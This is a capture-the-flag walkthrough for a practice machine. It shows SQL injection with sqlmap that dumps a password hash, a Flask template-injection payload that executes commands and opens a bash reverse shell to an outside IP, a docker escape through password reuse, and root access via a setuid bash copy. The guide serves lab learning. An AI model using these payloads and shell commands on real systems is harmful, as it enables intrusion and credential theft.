# GoodGames - HackThebox Walkthrough

<img src="../htb_assets/images/2022-07-30-08-44-49-image.png"/>



## 1. Enumeration

### Nmap Initial Scan

```
┌──(root💀kali)-[~/htb/machines/goodgames]
└─# nmap -sC -sV -oN nmap_init 10.10.11.130               
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-30 05:15 EDT
Nmap scan report for 10.10.11.130
Host is up (0.27s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
Service Info: Host: goodgames.htb

```



Going through the web application, found login page which is vulnerable to SQL Injection.



### SQLmap

```
┌──(root💀kali)-[~/htb/machines/goodgames]
└─# sqlmap -u 'http://goodgames.htb/login' --data 'email=a&password=b' --dbs --batch                                                                                                     1 ⨯
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:11:00 /2022-07-30/

[14:11:00] [INFO] resuming back-end DBMS 'mysql' 
[14:11:00] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=admin' AND (SELECT 9219 FROM (SELECT(SLEEP(5)))RSrB) AND 'kdOW'='kdOW&password=password
---
[14:11:00] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[14:11:00] [INFO] fetching database names
[14:11:00] [INFO] fetching number of databases
[14:11:00] [INFO] resumed: 2
[14:11:00] [INFO] resuming partial value: information_sche
[14:11:00] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                              
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[14:11:15] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[14:11:26] [INFO] adjusting time delay to 2 seconds due to good response times
ma
[14:11:34] [INFO] retrieved: main
available databases [2]:
[*] information_schema
[*] main

[14:12:05] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/goodgames.htb'

[*] ending @ 14:12:05 /2022-07-30/

```

Found 2 databases: information_schema and main.



```
┌──(root💀kali)-[~/htb/machines/goodgames]
└─# sqlmap -u 'http://goodgames.htb/login' --data 'email=a&password=b' --batch -D main --tables

[14:14:35] [INFO] retrieved: blog
[14:15:12] [INFO] retrieved: blog_comments
[14:16:45] [INFO] retrieved: user
Database: main
[3 tables]
+---------------+
| user          |
| blog          |
| blog_comments |
+---------------+

```

After checking tables under main db, found 3 tables including user table. Dumping user table will gives username and password hash.

```
┌──(root💀kali)-[~/htb/machines/goodgames]
└─# sqlmap -u 'http://goodgames.htb/login' --data 'email=a&password=b' --batch -D main -T user --dump

Database: main
Table: user
[1 entry]
+----+-------+---------------------+----------------------------------+
| id | name  | email               | password                         |
+----+-------+---------------------+----------------------------------+
| 1  | admin | admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec |
+----+-------+---------------------+----------------------------------+

```

So cracking the password hash using crackstation.net gives *superadministrator* as password.

Found subdomain *internal-administration.goodgames.htb* and added it to /etc/hosts. Its login page  and we can login using admin credentials previously found. 

Under settings page, we can edit user profile information. As it is using flask, it is vulnerable to SSTI template injection.

<img src="../htb_assets/images/2022-07-30-15-23-16-image.png)

We can  see here that after injecting 7*7, it is reflected back after calculation. After searching for SSTI payloads, found a payload to list all objects in there.

```
{{''.__class__.mro()[1].__subclasses__() }}
```

<img src="../htb_assets/images/2022-07-30-15-34-52-image.png"/>

copying all to vs code and analysing will show class Popen which used to execute system commands.

<img src="../htb_assets/images/2022-07-30-15-39-09-image.png"/>

Check the array  index of  <class 'subprocess.Popen'>

<img src="../htb_assets/images/2022-07-30-15-55-55-image.png"/>

Array index is 217 and we can pass shell commands.

```
{{''.__class__.mro()[1].__subclasses__()[217]('whoami',shell=True,stdout=-1).stdout.read().decode('utf-8') }}
```

<img src="../htb_assets/images/2022-07-30-16-01-44-image.png"/>

Command execution was successful. And reverse shell can be taken after passing  bash reverse shell command.

```
{{''.__class__.mro()[1].__subclasses__()[217]("bash -c 'bash -i >& /dev/tcp/10.10.14.12/4242 0>&1
'",shell=True,stdout=-1).stdout.read().decode('utf-8') }}
```

Passing this command will gives reverse shell.

```
┌──(root💀kali)-[~/htb/machines/goodgames]
└─# nc -lvnp 4242                          
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4242
Ncat: Listening on 0.0.0.0:4242
Ncat: Connection from 10.10.11.130.
Ncat: Connection from 10.10.11.130:57594.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3a453ab39d3d:/backend# whoami
whoami
root
root@3a453ab39d3d:/backend# id
id
uid=0(root) gid=0(root) groups=0(root)
root@3a453ab39d3d:/backend#
```

Got the user flag from augustus user. But as this running inside a docker, we need to get out of it.

```
root@3a453ab39d3d:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255
        ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)
        RX packets 472  bytes 76836 (75.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 358  bytes 141490 (138.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

As its ip address is 172.19.0.2, its host ip will be 172.19.0.2.

Doing ssh on root user has failed. But on user augustus with password found previously will gives us ssh shell. (password: *superadministrator*)

```
root@3a453ab39d3d:~# ssh augustus@172.19.0.1
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$ whoami
augustus
augustus@GoodGames:~$ id
uid=1000(augustus) gid=1000(augustus) groups=1000(augustus)
augustus@GoodGames:~$ 

```

Now we are on the host machine as augustus user.

## Privilege Escalation

As augustus user copy bash binary to home folder.

```
augustus@GoodGames:~$ cp /bin/bash .
augustus@GoodGames:~$ ls
bash  user.txt


```

Exit to the docker container and move to home directory of augustus.

Make bash binary owned by root

```
root@3a453ab39d3d:~# chown root:root bash

root@3a453ab39d3d:~# ls -la
total 1100
drwx------ 1 root root    4096 Jul 30 20:39 .
drwxr-xr-x 1 root root    4096 Nov  5  2021 ..
lrwxrwxrwx 1 root root       9 Nov  5  2021 .bash_history -> /dev/null
-rw-r--r-- 1 root root     570 Jan 31  2010 .bashrc
drwx------ 3 root root    4096 Nov  5  2021 .cache
-rw-r--r-- 1 root root     148 Aug 17  2015 .profile
drwx------ 2 root root    4096 Jul 30 20:28 .ssh
-rwxr-xr-x 1 root root 1099016 Jul 30 20:39 bash

```



Set SETUID bit permission to it,

```bash
root@3a453ab39d3d:~# chmod +s bash
root@3a453ab39d3d:~# ls -la
total 1100
drwx------ 1 root root    4096 Jul 30 20:39 .
drwxr-xr-x 1 root root    4096 Nov  5  2021 ..
lrwxrwxrwx 1 root root       9 Nov  5  2021 .bash_history -> /dev/null
-rw-r--r-- 1 root root     570 Jan 31  2010 .bashrc
drwx------ 3 root root    4096 Nov  5  2021 .cache
-rw-r--r-- 1 root root     148 Aug 17  2015 .profile
drwx------ 2 root root    4096 Jul 30 20:28 .ssh
-rwsr-sr-x 1 root root 1099016 Jul 30 20:39 bash
```

  Then ssh back as user augustus and execute bash binary.

```bash
augustus@GoodGames:~$ ./bash -p
bash-5.1# whoami
root

```

Got the root flag !!!
